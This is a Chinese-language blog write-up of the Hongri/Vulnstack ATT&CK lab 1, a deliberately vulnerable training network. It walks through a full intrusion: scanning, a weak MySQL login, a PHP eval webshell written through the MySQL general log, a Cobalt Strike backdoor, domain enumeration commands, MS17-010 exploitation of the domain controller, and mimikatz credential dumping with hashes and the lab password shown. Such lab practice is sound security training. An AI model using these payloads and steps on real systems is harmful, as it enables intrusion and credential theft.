---
title: 红日ATT&CK之一
tags:
  - 内网渗透
  - ATT&CK
  - 红日靶场
categories:
  - 内网渗透
description: 红日ATT&CK之一
excerpt: 红日ATT&CK之一
typora-root-url: 红日ATT-CK之一
abbrlink: 13157
date: 2022-04-09 14:53:04
---

## 红日ATT&CK 靶场一

> 下载地址：[漏洞详情 (qiyuanxuetang.net)](http://vulnstack.qiyuanxuetang.net/vuln/detail/2/)
> 
> 共13G，百度网盘资源。

### 环境配置

下载好后全部使用VMWare打开，然后密码登录时会要求修改。

默认密码为：**hongrisec@2019**

先说一下网络的配置，由于域的IP段是固定的192.168.52.0/24，因此先修改一下VMWare的VMNet1的配置：

![image-20220409150058869](./image-20220409150058869.png)

然后三个虚拟机的网络配置分别是：

Win 7，充当服务器：

要求可以访问内网以及外网，所以设两个网卡，一个是VMNet1一个是VMNet8，即一个HostOnly和一个NAT：

![image-20220409150258731](./image-20220409150258731.png)

Win2K3与Server 2008都是域内的，因此都只需要一个网卡，设为VMNet1(HostOnly)。

Win7的服务是没有开的，需要自己开，在C盘里找到PHPStudy启动即可。

此外Win7的防火墙默认是全开的(外网都访问不到该机器，这是不合理的)，自己关闭一下即可：

```powershell
netsh advfirewall set allprofiles state off
```

接下来对外围的打点话，其实我一般倾向于在Windows上完成，快速地将VMWare主机名解析到主机的话，可以考虑一下使用我自己写的Powershell小工具，安装：

```powershell
Install-Module -Name vmware-better-network-resolve
```

使用前请参考VMWare官方设置你的VMRest credentials，然后：

```powershell
Set-VMHostAuto
```

这会自动读取正在运行的虚拟机并将其Path解析到对应的IP地址：

![image-20220409151801323](./image-20220409151801323.png)

如果你觉得名称过长，可以考虑使用手动指定：

```powershell
Set-VMHostManual -Id 1ARP6PS8FBHPF0F61UPK3I9SC5FLODHR -HostName win-server
```

相关ID你可以观察自动解析的结果。

随后你就可以直接使用主机名访问该虚拟机：

![image-20220409151942419](./image-20220409151942419.png)

### 外围打点

> 按流程走

#### 信息收集

##### 端口信息

```bash
nmap -sC -sV -A -p- 192.168.237.130
```

结果如下：

![image-20220409152753743](./image-20220409152753743.png)

这里初步拿到的信息有不少，第一个是80端口和3306端口是开放的，并且可以看到PHP的版本以及是使用PHPStudy进行部署的。

其二是445端口，这个端口有着比较著名的漏洞MS17-010。

##### Nikto扫描

再用Nikto扫一遍：

![image-20220409153356034](./image-20220409153356034.png)

这里的扫描结果其实暴露的东西并不多，一是PHPInfo，而是phpMyAdmin程序。

##### 自行收集

接下来自己访问一下看看，直接访问出来的是一个PHP探针页面：

![image-20220409153543295](./image-20220409153543295.png)

这里暴露的信息总结一下：

* 网站架设绝对路径
* 短标签以及ASP风格不支持
* 安全模式未启用
* CURL支持
* 错误显示
* 允许远程文件

在这个页面下面还有一个MySQL数据库连接检测，尝试弱密码。

试出来是`root@root`

#### phpMyAdmin利用

由于上面试出来了弱密码，因此下一步就很简单了，直接访问phpMyAdmin看看能不能登录。

直接root连了进去。

可以看到如下的数据库：

![image-20220409153945229](./image-20220409153945229.png)

其实只有一个是用户的数据库==>`newyxcms`，其余库都是MySQL的。

直接看一下这个cms的用户名和密码，`username=admin，password=168a73655bfecefdb15b14984dd2ad60`，尝试一下MD5爆破，付费记录，未果。

前面说了探针暴露了其网站的假设绝对路径，于是我们可以尝试使用MySQL写一个webshell：

![image-20220409154436315](./image-20220409154436315.png)

会发现一个问题就是我们没有权限写入。

那么可以考虑一下利用MySQL的日志来进行写Shell了。

![image-20220409154608606](./image-20220409154608606.png)

可以看到原来的一个日志是关闭的，并且路径指定到了MySQL的安装路径。

我们这里直接修改路径并且启用日志。

```sql
set global general_log = "ON"
set global general_log_file = "C:\\phpStudy\\WWW\\index000.php"
```

然后执行一下SQL即可：

```sql
select '<?php eval($_POST[evalexp]);?>'
```

接着访问该webshell：

![image-20220409155219863](./image-20220409155219863.png)

蚁剑连接，然后拿到一个模拟的shell：

![image-20220409155259142](./image-20220409155259142.png)

#### YXCMS

> 另一种getshell的方式

目录扫描可以扫到beifen.rar，打开后可以发现yxcms，访问可以看到公告栏：

![image-20220409160211595](./image-20220409160211595.png)

登录后可以创建模板文件，这也可以写shell，并且更加隐蔽。

### 内网渗透

#### 信息收集

打开CS，创建监听器，生成一个Windows的后门程序，然后用蚁剑传过去。

执行该程序，应该可以看到反弹的shell：

![image-20220409164350774](./image-20220409164350774.png)

成功上线。

直接尝试提权：

![image-20220409164652826](./image-20220409164652826.png)

提权成功：

![image-20220409164725816](./image-20220409164725816.png)

接下来收集主机信息和域信息：

```powershell
ipconfig /all   查看本机ip，所在域

route print     打印路由信息

net view        查看局域网内其他主机名

arp -a          查看arp缓存

whoami

net start       查看开启了哪些服务

net share       查看开启了哪些共享

net share ipc$  开启ipc共享

net share c$    开启c盘共享

net use \\192.168.xx.xx\ipc$ "" /user:""   与192.168.xx.xx建立空连接

net use \\192.168.xx.xx\c$ "密码" /user:"用户名"  建立c盘共享

dir \\192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件

net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域

net user                 查看本机用户列表

net user /domain         查看域用户

net localgroup administrators   查看本地管理员组（通常会有域用户）

net view /domain         查看有几个域

net user 用户名 /domain   获取指定域用户的信息

net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）

net group 组名 /domain    查看域中某工作组

net group "domain admins" /domain  查看域管理员的名字

net group "domain computers" /domain  查看域中的其他主机名

net group "doamin controllers" /domain  查看域控制器（可能有多台）
```

使用`net config Workstation`查看比较全面的信息：

![image-20220409171248067](./image-20220409171248067.png)

再次查看域信息：

![image-20220409171319816](./image-20220409171319816.png)

获取一下域内用户的信息：

![image-20220409171457946](./image-20220409171457946.png)

查看一下域控制器：

![image-20220409172414780](./image-20220409172414780.png)

使用beacon的net view可以获取到域内机器名以及IP：

![image-20220409172442307](./image-20220409172442307.png)

此时的一个拓扑图如图：

![image-20220409230503083](./image-20220409230503083.png)

#### 横向移动

##### 会话派生

启动MSF并且使用HTTP反弹shell的handler监听：

![image-20220409231013646](./image-20220409231013646.png)

然后开始监听，在CS里创建一个外部Listener：

![image-20220409231133870](./image-20220409231133870.png)

然后直接把会话派生给MSF`spawn CS2MSF`。

在MSF端就能接收到CS派生的会话了。

这里派生出来的是系统权限的：

![image-20220409231828126](./image-20220409231828126.png)

##### 内网嗅探

前面已经知道了域内有其它机器：

* OWA 192.168.52.138
* ROOT-TVI862UBEH 192.168.52.141

由于我们无法直接访问内网，先用MSF开一下自动路由。

![image-20220409232419532](./image-20220409232419532.png)

接下来我们就开始以该Win7为跳板，开始攻击域内主机。

先进行一个常规端口扫描：

> 速度挺一言难尽的，建议只测常见端口，一万个端口扫了挺久的。

![image-20220409235637333](./image-20220409235637333.png)

另一台机器的话，只扫描了常见端口。

另一台：

![image-20220410000014133](./image-20220410000014133.png)

可以看到445都开着。

##### MS17-010利用拿下域控

嗅探一下看看能不能使：

![image-20220410000259360](./image-20220410000259360.png)

发现好像都可以使用。

于是，直接使用MS17-010开始利用。

> 这个漏洞比较玄学，用的bind_tcp是拿不到的。

payload自动设为reverse_tcp，注意改一下LHOST为跳板机IP：

![image-20220410002241016](./image-20220410002241016.png)

然后攻击后可以拿到shell。

> 拿不到多试试，比较玄学。

![image-20220410002509539](./image-20220410002509539.png)

域控主机拿下就是系统权限。

##### 图形化域控

先把Win7的RDP打开:

```bash
run post/windows/manage/enable_rdp
```

![image-20220410004137960](./image-20220410004137960.png)

然后远程连接Win7.

同样打开2008的远程，接着MSF看一下密码。

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username      Domain  LM                                NTLM                              SHA1
--------      ------  --                                ----                              ----
OWA$          GOD                                       7138b1b282d2b65b78d86d1f68b470b0  140d2eb4c49a4196a61d4970026fa7b8b940a4ad
liukaifeng01  GOD     0e6a7aaeba5a8524bfae8bea1f754223  1c36e6503a34d05d29f4a86fdaf45cae  37edabb3a1c364ba301ea5ecbab81db8bc70c7a8

wdigest credentials
===================

Username      Domain  Password
--------      ------  --------
(null)        (null)  (null)
OWA$          GOD     f1 67 2b ab 2a cf b9 80 42 1e d0 c8 ee 8a 21 40 e8 69 b6 d4 30 db 2c 69 eb ea ee 2e a4 e7 b2 b5 6d 9d c9 62 37 18 8b f9 b7 d0 96 fc 8
                      e 16 f2 b7 3b 34 a7 f8 13 a4 b6 96 69 db 82 60 45 20 f7 df 84 de da 47 3f 17 95 00 42 55 91 d3 91 4a d9 42 a5 de 5e 46 7d e1 af db ea
                       6b 81 96 2e 90 9c 05 51 52 88 5a a3 5b 17 65 33 e7 2d c9 44 52 17 7a 92 3f 75 b0 92 13 21 89 9f be 84 93 30 8f ce 44 3f d8 65 fd 0c
                      2e 88 8b f8 f3 8e 3e 09 8c ae 28 52 d6 e9 af db f8 6e 17 4d d5 dc 71 79 d1 30 28 2e 79 ab cb 55 1a 75 76 22 bb 0d ca 07 7f 2f 6d d5 b
                      7 7c 2a b2 9a e6 7e e4 5a a8 5b 43 0e 73 ae aa c8 e7 64 3b 31 ff 85 78 e9 57 34 fa 2d 83 7d 22 1f e3 c1 1e 5c 02 37 54 ba 56 d0 41 23
                       be ac 74 1b 2d f6 b6 6f 08 74 fe 34 26 7f 97 4f 00 38
liukaifeng01  GOD     QWERasdf@123

tspkg credentials
=================

Username      Domain  Password
--------      ------  --------
liukaifeng01  GOD     QWERasdf@123

kerberos credentials
====================

Username      Domain   Password
--------      ------   --------
(null)        (null)   (null)
liukaifeng01  GOD.ORG  QWERasdf@123
owa$          GOD.ORG  f1 67 2b ab 2a cf b9 80 42 1e d0 c8 ee 8a 21 40 e8 69 b6 d4 30 db 2c 69 eb ea ee 2e a4 e7 b2 b5 6d 9d c9 62 37 18 8b f9 b7 d0 96 fc
                       8e 16 f2 b7 3b 34 a7 f8 13 a4 b6 96 69 db 82 60 45 20 f7 df 84 de da 47 3f 17 95 00 42 55 91 d3 91 4a d9 42 a5 de 5e 46 7d e1 af db
                       ea 6b 81 96 2e 90 9c 05 51 52 88 5a a3 5b 17 65 33 e7 2d c9 44 52 17 7a 92 3f 75 b0 92 13 21 89 9f be 84 93 30 8f ce 44 3f d8 65 fd
                       0c 2e 88 8b f8 f3 8e 3e 09 8c ae 28 52 d6 e9 af db f8 6e 17 4d d5 dc 71 79 d1 30 28 2e 79 ab cb 55 1a 75 76 22 bb 0d ca 07 7f 2f 6d
                       d5 b7 7c 2a b2 9a e6 7e e4 5a a8 5b 43 0e 73 ae aa c8 e7 64 3b 31 ff 85 78 e9 57 34 fa 2d 83 7d 22 1f e3 c1 1e 5c 02 37 54 ba 56 d0
                       41 23 be ac 74 1b 2d f6 b6 6f 08 74 fe 34 26 7f 97 4f 00 38
```

可以看到密码了，直接远程登录。

![image-20220410005429691](./image-20220410005429691.png)

至此，整个内网都受我们控制了。

### 疑问总结

* MS17-010始终拿不到shell
  * 怀疑可能是由于配置的LHOST是Kali的IP，由于不出网，反弹不回来，所以设LHOST为跳板即可
* CS的net view IP一直在变
  * Win7出网了，god.org有解析记录。
  * 解决办法很简单，要么改hosts文件，要么把出网网卡的DNS解析服务器手动指定为owa，即`192.168.52.138` **推荐**
* 为什么不把另一台拿下
  * 网上有些做法是利用MS17-010添加用户啥的，但是拿到域控了实际就可以修改该计算机的配置，还需要大费周章去利用漏洞吗？

其余的问题应该都在本文有详细讲解了。
